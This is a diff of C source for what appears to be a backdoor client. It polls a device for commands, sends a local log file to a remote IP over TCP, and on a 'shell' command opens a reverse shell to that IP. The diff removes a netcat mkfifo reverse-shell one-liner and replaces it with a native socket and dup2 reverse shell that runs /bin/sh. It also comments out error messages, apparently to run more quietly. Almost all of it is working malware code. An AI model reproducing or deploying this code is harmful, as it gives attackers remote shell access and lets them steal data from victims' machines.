@@ -10,6 +10,7 @@
 #include <sys/types.h>
 #include <netinet/in.h>
 #include <sys/socket.h>
+#include <arpa/inet.h>
 
 #define DEVICE "/dev/cd"
 #define LOGFILE "/log.txt"
@@ -25,8 +26,6 @@ int main(int argc, char *argv[]) {
     if (argc != 2) {
         exit(1);
     }
-    sendLog(argv[1]);
-    return 0;
     while (1) {
         if ((fd = open(DEVICE, O_RDWR)) != -1) {
             read(fd, buf, 100);
@@ -40,10 +39,8 @@ int main(int argc, char *argv[]) {
             else if (strncmp(buf, "shell", 5) == 0) {
                 if (fork() == 0) {
                     //printf("Sending shell\n");
-                    //sprintf(cmd, "python /remote.py %s %d", argv[1], PORT);
-                    //system(cmd);
                     reverseShell(argv[1]);
-                    return 0;
+                    exit(0);
                 }
             }
             else {
@@ -61,12 +58,12 @@ int sendLog(char* ip) {
 
 
     if ((he=gethostbyname(ip)) == NULL) {  /* get the host info */
-        herror("gethostbyname");
+        //herror("gethostbyname");
         return 1;
     }
 
     if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
-        perror("socket");
+        //perror("socket");
         return 1;
     }
 
@@ -77,20 +74,21 @@ int sendLog(char* ip) {
 
     if (connect(sockfd, (struct sockaddr *)&their_addr, \
                                           sizeof(struct sockaddr)) == -1) {
-        perror("connect");
+        //perror("connect");
         return 1;
     }
     FILE *log = fopen(LOGFILE, "r");
     if (log == NULL) {
-        printf("File not found");
+        //printf("File not found");
         return 1;
     }
     char sendbuf[100] = {0};
     while (fgets(sendbuf,100,log) != NULL) {
-        printf("Sending: %s\n", sendbuf);
-        while (send(sockfd, sendbuf, 100, 0) == -1){
+        //printf("Sending: %s\n", sendbuf);
+        if (send(sockfd, sendbuf, 100, 0) == -1){
               //perror("send");
-              continue;
+              close(sockfd);
+              return 0;
         }
         usleep(100000);
 
@@ -101,29 +99,21 @@ int sendLog(char* ip) {
     return 0;
 }
 
-void reverseShell(char *getIP){
+void reverseShell(char *REMOTE_ADDR){
+	//Listen by nc -lvp 8888
 
-	//Hardcoded  ip and port
-	//Listen by nc -lvp <port details>
-	//http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
-	
-	char header[100]="rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ";
-	char ip[100];
-	char port[100];
-	char footer[50]=" >/tmp/f";
-	
-	//copy argv[1] into buffer 
-	strcpy(ip,getIP);
-	//convert integer PORT to string and save it to buffer
-	sprintf(port,"%d",PORT);
-	
-	//create payload
-	strcat(header, ip);
-	strcat(header, " ");
-	strcat(header, port);
-	strcat(header, footer);	
-    
-    //printf("%s\n",header);
-    system(header);
+    struct sockaddr_in sa;
+    int s;
 
+    sa.sin_family = AF_INET;
+    sa.sin_addr.s_addr = inet_addr(REMOTE_ADDR);
+    sa.sin_port = htons(PORT);
+
+    s = socket(AF_INET, SOCK_STREAM, 0);
+    connect(s, (struct sockaddr *)&sa, sizeof(sa));
+    dup2(s, 0);
+    dup2(s, 1);
+    dup2(s, 2);
+
+    execl("/bin/sh", "/bin/sh", "-i", NULL);
 }
